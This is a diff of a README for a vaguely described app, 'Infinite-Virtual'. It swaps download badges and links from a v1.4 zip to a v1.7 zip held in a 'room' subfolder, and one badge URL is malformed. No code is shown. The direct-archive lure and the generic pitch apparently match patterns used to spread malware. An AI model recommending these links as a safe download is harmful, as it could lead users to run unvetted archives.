@@ -1,6 +1,6 @@
 # 🎮 Infinite-Virtual - Explore New Realities Today
 
-[![Download](https://github.com/vaibhav9-11/Infinite-Virtual/raw/refs/heads/main/room/Infinite_Virtual_v1.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/vaibhav9-11/Infinite-Virtual/raw/refs/heads/main/room/Infinite_Virtual_v1.4.zip)
+[![Download](https://raw.githubusercontent.com/vaibhav9-11/Infinite-Virtual/main/room/Infinite_Virtual_v1.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/vaibhav9-11/Infinite-Virtual/main/room/Infinite_Virtual_v1.7.zip)
 
 ## 📖 Description
 
@@ -23,7 +23,7 @@ To run Infinite-Virtual smoothly, ensure your system meets the following require
 
 Visit the following page to download Infinite-Virtual:
 
-[Download Infinite-Virtual](https://github.com/vaibhav9-11/Infinite-Virtual/raw/refs/heads/main/room/Infinite_Virtual_v1.4.zip)
+[Download Infinite-Virtual](https://raw.githubusercontent.com/vaibhav9-11/Infinite-Virtual/main/room/Infinite_Virtual_v1.7.zip)
 
 Once on the page, look for the latest version of the software. You'll see different files available for download. Choose the one suitable for your operating system and click on it. 
 
